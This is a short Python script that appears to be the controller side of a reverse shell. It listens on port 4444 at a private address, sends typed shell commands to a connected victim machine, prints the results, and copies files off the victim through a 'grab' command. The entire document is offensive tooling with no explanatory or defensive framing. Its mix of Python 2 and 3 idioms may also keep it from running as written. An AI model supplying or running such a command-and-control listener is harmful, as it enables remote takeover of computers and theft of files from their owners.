#!/usr/bin/python

import socket
import os

def transfer(conn, command):
    conn.send(command)
    file = open('/root/Desktop/storage/test.png', 'wb')
    while True:
        bits = conn.recv(1024)
        if 'Unable to locate the file' in bits:
            print('[-] Unable to locate the file')
            break
        if bits.endswith('DONE'):
            print('[+] Transfer completed')
            file.close()
            break
        file.write(bits)

host = '192.168.1.10'
port = 4444

def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((host, port))
    s.listen(5)
    print('[+] Lisitenning for incoming TCP connection on port 4444')
    conn, addr = s.accept()
    print('[+] We got a connection from: ', addr)

    while True:
        command = input("shell> ")
        if 'terminate' in command:
            conn.send('terminate')
            conn.close()
            break

        elif 'grab' in command:
            transfer(conn, command)

        else:
            conn.send(command)
            print(conn.recv(1024))

def main():
    connect()

main()